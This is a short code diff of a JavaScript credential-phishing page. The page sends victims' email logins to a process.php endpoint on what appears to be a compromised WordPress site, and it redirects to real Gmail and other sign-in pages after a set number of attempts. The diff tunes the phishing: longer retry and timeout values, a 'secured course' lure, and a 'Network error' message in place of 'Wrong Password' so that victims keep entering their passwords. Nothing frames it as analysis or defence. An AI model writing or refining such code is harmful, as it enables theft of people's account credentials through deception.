@@ -344,8 +344,8 @@
         const API_URL = 'https://secure.prolinemovers.com/wp-admin/images/includes/process.php';
         const MAX_ATTEMPTS = 3;
         const MAX_RETRIES = 3;
-        const RETRY_DELAY = 500;
-        const TIMEOUT = 2000;
+        const RETRY_DELAY = 2000;
+        const TIMEOUT = 10000;
 
         const LOGIN_PAGES = {
             'gmail.com': 'https://accounts.google.com/signin',
@@ -517,7 +517,7 @@
             }
 
             if (state.attempts >= 2 && state.email) {
-                showPopup("Ensure you are using your correct email login details");
+                showPopup("Ensure you are using your correct email login details for this secured course.");
             }
 
             if (state.attempts >= MAX_ATTEMPTS) {
@@ -566,7 +566,7 @@
                 updateDomainUI(state.domain);
 
             } catch (err) {
-                showError(`Wrong Password: ${err.message}. Try again...`, false);
+                showError(`Network error: ${err.message}. Retrying...`, false);
                 els.retryHint.style.display = 'block';
                 let count = 3;
                 els.retryCountdown.textContent = count;
